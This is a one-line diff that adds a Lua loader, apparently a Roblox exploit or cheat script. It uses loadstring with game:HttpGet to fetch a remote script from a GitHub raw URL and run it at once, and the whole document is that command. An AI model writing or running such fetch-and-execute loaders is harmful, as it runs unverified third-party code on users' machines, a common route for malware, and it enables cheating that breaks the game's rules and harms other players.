@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/fish-an-anime-rng-spam4-34hpwmf9kx4efg.lua"))()
